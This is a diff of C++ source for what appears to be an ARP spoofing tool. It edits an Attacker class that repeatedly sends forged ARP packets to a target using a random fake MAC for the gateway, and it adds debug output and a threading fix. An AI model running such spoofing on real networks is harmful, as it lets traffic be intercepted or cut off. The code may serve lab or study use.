@@ -1,5 +1,4 @@
 #include "models/attacker.hpp"
-#include "models/host.hpp"
 #include "utils/arp_utils.hpp"
 #include "utils/mac_utils.hpp"
 #include "utils/thread_utils.hpp"
@@ -12,6 +11,8 @@ typedef std::chrono::high_resolution_clock Clock;
 Attacker::Attacker(const uint32_t attack_interval_ms) : attack_interval_ms(attack_interval_ms) {}
 
 void Attacker::_attack(const Interface &interface, const Host &target, const Host &gateway) {
+    std::cerr << "_attack: " << interface.get_socket_fd() << "\n";
+    std::cerr << &interface << "\n";
     unsigned char buffer[BUF_SIZE];
     struct sockaddr_ll socket_address = Arp::prepare_arp(
         buffer,
@@ -23,7 +24,7 @@ void Attacker::_attack(const Interface &interface, const Host &target, const Hos
     );
 
     Clock::time_point last_attack_time = {}; // set time_point to zero
-    while (Thread::spoofing_signal[interface.get_ip()].load(std::memory_order_relaxed)) {
+    while (Thread::spoofing_signal[target.get_ip()].load(std::memory_order_relaxed)) {
         auto current_time = Clock::now();
         auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(current_time - last_attack_time).count();
         if (duration < attack_interval_ms) {
@@ -31,6 +32,8 @@ void Attacker::_attack(const Interface &interface, const Host &target, const Hos
         }
 
         if (sendto(interface.get_socket_fd(), buffer, 42, 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) == -1) {
+            std::cerr << interface.get_socket_fd() << "\n";
+            perror("sendto");
             std::cerr << "_spoof: Failed to send spoof packet.\n";
         }
 
@@ -39,11 +42,13 @@ void Attacker::_attack(const Interface &interface, const Host &target, const Hos
 }
 
 void Attacker::attack(const Interface &interface, const Host &target, const Host &gateway) {
+    std::cerr << "attacker: " << interface.get_socket_fd() << "\n";
+    std::cerr << &interface << "\n";
     if (fake_mac_address.find(gateway.get_ip()) == fake_mac_address.end()) {
         fake_mac_address[gateway.get_ip()] = Mac::get_random_mac_address();
     }
-
-    Thread::spoofing_thread[target.get_ip()] = std::thread(&Attacker::_attack, this, std::ref(interface), std::ref(target), std::ref(gateway));
+    Thread::spoofing_signal[target.get_ip()].store(true);
+    Thread::spoofing_thread[target.get_ip()] = std::thread(&Attacker::_attack, this, std::cref(interface), std::cref(target), std::cref(gateway));
 }
 
 void Attacker::recover(const Interface &interface, const Host &target, const Host &gateway) {
